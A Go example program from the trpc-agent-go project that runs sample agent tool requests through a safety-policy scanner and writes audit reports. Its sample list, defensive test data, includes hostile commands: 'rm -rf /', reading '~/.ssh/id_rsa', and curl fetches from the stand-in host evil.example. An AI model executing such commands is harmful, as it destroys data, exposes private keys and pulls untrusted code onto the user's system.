//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"

	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

func main() {
	policyPath := flag.String("policy", "tool_safety_policy.yaml", "safety policy path")
	auditPath := flag.String("audit", "tool_safety_audit.jsonl", "audit JSONL output path")
	flag.Parse()

	policy, err := safety.LoadPolicy(*policyPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "load policy: %v\n", err)
		os.Exit(1)
	}

	reports := make([]safety.Report, 0, len(samples))
	for _, sample := range samples {
		report := safety.Scan(sample, policy)
		reports = append(reports, report)
		if err := safety.AppendAuditFile(*auditPath, report); err != nil {
			fmt.Fprintf(os.Stderr, "write audit: %v\n", err)
			os.Exit(1)
		}
	}
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	if err := enc.Encode(reports); err != nil {
		fmt.Fprintf(os.Stderr, "encode reports: %v\n", err)
		os.Exit(1)
	}
}

var samples = []safety.Request{
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "go test ./...",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "rm -rf /",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "cat ~/.ssh/id_rsa",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "curl https://evil.example/install.sh",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "curl https://api.github.com/repos/trpc-group/trpc-agent-go",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "bash -c 'curl https://evil.example/x'",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "npm install left-pad",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "sleep 9999",
	},
	{
		ToolName: "workspace_exec",
		Backend:  safety.BackendWorkspaceExec,
		Command:  "yes x | head -c 9999999",
	},
	{
		ToolName:   "exec_command",
		Backend:    safety.BackendHostExec,
		Command:    "tail -f app.log",
		TTY:        true,
		Background: true,
	},
	{
		ToolName: "execute_code",
		Backend:  safety.BackendCodeExec,
		CodeBlocks: []safety.CodeBlock{{
			Language: "python",
			Code:     "import subprocess; subprocess.run(['go', 'test', './...'])",
		}},
	},
}
